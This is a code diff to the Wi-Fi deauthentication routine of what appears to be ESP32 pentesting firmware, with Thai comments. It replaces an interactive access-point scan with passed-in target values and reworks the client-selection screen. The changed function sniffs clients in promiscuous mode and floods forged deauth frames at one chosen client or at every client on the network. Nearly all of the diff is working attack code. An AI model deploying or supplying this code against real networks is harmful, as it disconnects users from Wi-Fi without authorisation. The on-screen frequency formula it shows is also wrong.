@@ -840,125 +840,44 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     cleanlyStopWebUiForWiFiFeature();
     if (!wifi_atk_setWifi()) return;
 
-    // ==================== STEP 1: AP SCAN ====================
-    // (เราไม่ใช้ค่า tssid/mac/channel ที่ส่งมา แต่ไปสแกนใหม่เอง)
-    String apSSID, apMAC;
-    uint8_t apChannel = 0;
-    bool apChosen = false;
-    int idx = 0, netCount = 0;
-
-    while (!apChosen) {
-        tft.fillScreen(bruceConfig.bgColor);
-        tft.setTextSize(1);
-        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-        tft.setCursor(4, 4);
-        tft.println("Select AP  [OK]=pick  [ESC]=quit");
-        tft.drawFastHLine(0, 18, tftWidth, TFT_DARKGREY);
-
-        netCount = WiFi.scanNetworks(false, false);
-        int y = 24;
-        for (int i = 0; i < netCount; i++) {
-            if (y > tftHeight - 14) break;
-            String ssid = WiFi.SSID(i);
-            if (ssid.isEmpty()) ssid = "<Hidden>";
-            int ch = WiFi.channel(i);
-            String line = ssid + "  CH" + String(ch);
-            if (line.length() > 27) line = line.substring(0, 26) + "~";
-
-            if (i == idx) {
-                tft.fillRect(0, y - 1, tftWidth, 14, TFT_NAVY);
-                tft.setTextColor(TFT_WHITE, TFT_NAVY);
-            } else {
-                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-            }
-            tft.setCursor(6, y);
-            tft.print(line);
-            y += 15;
-        }
-
-        if (check(NextPress)) { idx = (idx + 1) % netCount; delay(120); }
-        if (check(PrevPress)) { idx = (idx - 1 + netCount) % netCount; delay(120); }
-        if (check(SelPress) && netCount > 0) {
-            apSSID    = WiFi.SSID(idx);
-            apMAC     = WiFi.BSSIDstr(idx);
-            apChannel = WiFi.channel(idx);
-            apChosen  = true;
-        }
-        if (check(EscPress)) {
-            wifi_atk_unsetWifi();
-            returnToMenu = true;
-            return;
-        }
-        delay(50);
-    }
-
-    // ==================== STEP 2: PREPARE BSSID & SNIFF CLIENTS ====================
-    sscanf(apMAC.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+    // เตรียม BSSID
+    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &g_targetBssid[0], &g_targetBssid[1], &g_targetBssid[2],
            &g_targetBssid[3], &g_targetBssid[4], &g_targetBssid[5]);
 
     wifi_ap_record_t target_ap;
     memset(&target_ap, 0, sizeof(target_ap));
     memcpy(target_ap.bssid, g_targetBssid, 6);
-    target_ap.primary = apChannel;
+    target_ap.primary = channel;
 
+    // เปิดโหมดดมกลิ่น + เริ่มจับ client ทันที
     g_clients.clear();
     esp_wifi_set_promiscuous_rx_cb(promisc_callback);
-    esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     esp_wifi_set_promiscuous(true);
 
-    // หน่วงให้มี client บ้าง
-    unsigned long t0 = millis();
-    while (millis() - t0 < 2000) {
-        delay(50);
-        if (check(EscPress)) {
-            esp_wifi_set_promiscuous(false);
-            wifi_atk_unsetWifi();
-            returnToMenu = true;
-            return;
-        }
-    }
+    // รอสั้น ๆ 1 วิให้มี client เข้ามาบ้าง (ถ้ามี)
+    delay(1000);
 
-    // ==================== STEP 3: CHOOSE TARGET ====================
+    // ********** หน้าจอเลือก Client (อัปเดตเรียลไทม์) **********
     uint8_t *targetMac = nullptr;
     String targetName = "Broadcast";
     bool targetChosen = false;
     int tgtIdx = 0;
 
-    while (!targetChosen) {
-        unsigned long now = millis();
-        for (auto &c : g_clients) c.active = (now - c.last_seen < CLIENT_TIMEOUT);
-        auto it = g_clients.begin();
-        while (it != g_clients.end()) {
-            if (!it->active && (now - it->last_seen > CLIENT_TIMEOUT))
-                it = g_clients.erase(it);
-            else ++it;
-        }
+    // วาดหัวข้อและกรอบครั้งเดียว (ไม่ต้องล้างจอใหม่ทุกครั้ง)
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.setTextSize(1);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setCursor(4, 4);
+    tft.println("Select Client  [OK]=fire  [ESC]=back");
+    tft.drawFastHLine(0, 18, tftWidth, TFT_DARKGREY);
 
-        std::vector<String> names;
-        std::vector<uint8_t*> macs;
-        names.push_back("All Clients (Broadcast)");
-        macs.push_back(nullptr);
-        for (auto &c : g_clients) {
-            if (!c.active) continue;
-            char buf[18];
-            snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
-                     c.mac[0], c.mac[1], c.mac[2], c.mac[3], c.mac[4], c.mac[5]);
-            String o = getOUI(c.mac);
-            String s = String(buf);
-            if (o.length()) s += " (" + o + ")";
-            names.push_back(s);
-            macs.push_back(c.mac);
-        }
-        if (tgtIdx >= (int)names.size()) tgtIdx = names.size() - 1;
-
-        tft.fillScreen(bruceConfig.bgColor);
-        tft.setTextSize(1);
-        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-        tft.setCursor(4, 4);
-        tft.println("Target  [OK]=fire  [ESC]=back");
-        tft.drawFastHLine(0, 18, tftWidth, TFT_DARKGREY);
-
+    // ฟังก์ชันช่วยวาดรายการใหม่ (เฉพาะแถวที่มีการเปลี่ยนแปลง)
+    int prevClientCount = -1;  // ใช้ตรวจสอบว่ามี client ใหม่เข้ามาหรือไม่
+    auto drawClientList = [&](const std::vector<String>& names) {
+        // ล้างเฉพาะพื้นที่ใต้หัวข้อ (y=20 ถึง tftHeight-4)
+        tft.fillRect(0, 22, tftWidth, tftHeight - 26, bruceConfig.bgColor);
         int y = 24;
         for (int i = 0; i < (int)names.size(); i++) {
             if (y > tftHeight - 14) break;
@@ -972,9 +891,57 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             tft.print(names[i]);
             y += 15;
         }
+    };
 
-        if (check(NextPress)) { tgtIdx = (tgtIdx + 1) % names.size(); delay(120); }
-        if (check(PrevPress)) { tgtIdx = (tgtIdx - 1 + names.size()) % names.size(); delay(120); }
+    while (!targetChosen) {
+        // อัปเดตสถานะ client
+        unsigned long now = millis();
+        for (auto &c : g_clients) c.active = (now - c.last_seen < CLIENT_TIMEOUT);
+        // ลบ inactive เก่าทิ้ง
+        auto it = g_clients.begin();
+        while (it != g_clients.end()) {
+            if (!it->active && (now - it->last_seen > CLIENT_TIMEOUT))
+                it = g_clients.erase(it);
+            else ++it;
+        }
+
+        // สร้างรายชื่อ (Broadcast + clients)
+        std::vector<String> names;
+        std::vector<uint8_t*> macs;
+        names.push_back("All Clients (Broadcast)");
+        macs.push_back(nullptr);
+        for (auto &c : g_clients) {
+            if (!c.active) continue;
+            char buf[18];
+            snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
+                     c.mac[0], c.mac[1], c.mac[2], c.mac[3], c.mac[4], c.mac[5]);
+            String oui = getOUI(c.mac);
+            String name = String(buf);
+            if (oui.length() > 0) name += " (" + oui + ")";
+            names.push_back(name);
+            macs.push_back(c.mac);
+        }
+        // ป้องกัน index หลุด
+        if (tgtIdx >= (int)names.size()) tgtIdx = names.size() - 1;
+        if (tgtIdx < 0) tgtIdx = 0;
+
+        // วาดใหม่เฉพาะเมื่อจำนวน client เปลี่ยน หรือครั้งแรก
+        if (prevClientCount != (int)names.size()) {
+            drawClientList(names);
+            prevClientCount = names.size();
+        }
+
+        // ตรวจจับปุ่มกด
+        if (check(NextPress)) {
+            tgtIdx = (tgtIdx + 1) % names.size();
+            drawClientList(names); // วาดใหม่เพื่อเลื่อน highlight
+            delay(120);
+        }
+        if (check(PrevPress)) {
+            tgtIdx = (tgtIdx - 1 + names.size()) % names.size();
+            drawClientList(names);
+            delay(120);
+        }
         if (check(SelPress)) {
             targetMac   = macs[tgtIdx];
             targetName  = names[tgtIdx];
@@ -986,22 +953,22 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             returnToMenu = true;
             return;
         }
-        delay(50);
+        delay(10);  // ลดการใช้ CPU
     }
 
-    // ==================== STEP 4: SETUP DEAUTH FRAME ====================
+    // ********** เริ่ม Deauth Attack (UI เดิม) **********
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     bool isBroadcast = (targetMac == nullptr);
     if (isBroadcast) {
-        wsl_bypasser_send_raw_frame(&target_ap, apChannel, _default_target);
+        wsl_bypasser_send_raw_frame(&target_ap, channel, _default_target);
     } else {
         memcpy(&deauth_frame[4],  targetMac,       6);
         memcpy(&deauth_frame[10], g_targetBssid,    6);
         memcpy(&deauth_frame[16], g_targetBssid,    6);
-        esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     }
 
-    // ==================== STEP 5: ATTACK LOOP ====================
+    // Layout constants
     const uint8_t TOP_MARGIN = 2, INFO_H = 60;
     const uint8_t CLIENT_HEADER_H = 14, ROW_H = 14, MAX_ROWS = 6;
     const uint8_t TABLE_Y = TOP_MARGIN + INFO_H + CLIENT_HEADER_H;
@@ -1018,6 +985,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
 
     tft.fillRect(0, tftHeight - 14, tftWidth, 14, bruceConfig.bgColor);
 
+    // Main attack loop (เหมือนเดิมทุกประการ)
     while (true) {
         bool selNow = check(SelPress);
         if (selNow && !lastSel) { paused = !paused; lastUI = 0; }
@@ -1025,7 +993,6 @@ void target_atk(String tssid, String mac, uint8_t channel) {
         if (EscPress) break;
 
         if (!paused) {
-            // 💡 แยกโหมด Broadcast (แรง) / Single (นุ่มนวล)
             int loopCount = isBroadcast ? 100 : 5;
             int frameDelay = isBroadcast ? 0 : 8;
             int burstPause = isBroadcast ? 0 : 50;
@@ -1035,7 +1002,6 @@ void target_atk(String tssid, String mac, uint8_t channel) {
                 count += 3;
                 totalFrames += 3;
                 if (EscPress) break;
-
                 if (!isBroadcast) delay(frameDelay);
 
                 bool s = check(SelPress);
@@ -1045,21 +1011,20 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             }
             if (!isBroadcast) delay(burstPause);
 
-            // refresh channel ตามโหมด
             static uint16_t refCnt = 0;
             refCnt += (loopCount * 3);
             if (refCnt >= 3000) {
                 if (isBroadcast)
-                    wsl_bypasser_send_raw_frame(&target_ap, apChannel, _default_target);
+                    wsl_bypasser_send_raw_frame(&target_ap, channel, _default_target);
                 else
-                    esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
+                    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
                 refCnt = 0;
             }
         } else {
             delay(50);
         }
 
-        // clean client list
+        // Client cleanup
         if (millis() - lastClean > CLEAN_MS) {
             lastClean = millis();
             unsigned long nw = millis();
@@ -1072,7 +1037,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             }
         }
 
-        // footer progress bar
+        // Footer
         if (millis() - lastFooter > FOOTER_MS) {
             lastFooter = millis();
             tft.fillRect(0, tftHeight - 14, tftWidth, 14, bruceConfig.bgColor);
@@ -1093,7 +1058,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             tft.drawString(fs, bx + bw + 6, by, 1);
         }
 
-        // main UI
+        // Main UI
         if (millis() - lastUI > 2000) {
             lastUI = millis();
             tft.fillRect(0, 0, tftWidth, tftHeight - 14, bruceConfig.bgColor);
@@ -1105,11 +1070,11 @@ void target_atk(String tssid, String mac, uint8_t channel) {
 
             tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
 
-            String s1 = "AP: " + apSSID;       if (s1.length()>18) s1 = s1.substring(0,17)+"~";
-            String s2 = "MAC: " + apMAC;       if (s2.length()>13) s2 = s2.substring(0,12)+"~";
+            String s1 = "AP: " + tssid;       if (s1.length()>18) s1 = s1.substring(0,17)+"~";
+            String s2 = "MAC: " + mac;        if (s2.length()>13) s2 = s2.substring(0,12)+"~";
             tft.drawString(s1, lx, yl, 1); yl += 12;
             tft.drawString(s2, lx, yl, 1); yl += 12;
-            tft.drawString("Ch: " + String(apChannel) + " (" + String(2400+apChannel) + "MHz)", lx, yl, 1); yl += 12;
+            tft.drawString("Ch: " + String(channel) + " (" + String(2400+channel) + "MHz)", lx, yl, 1); yl += 12;
 
             int fps = count / 2;
             uint16_t fcol = (fps>3000) ? TFT_GREEN : (fps>1000) ? TFT_YELLOW : TFT_RED;
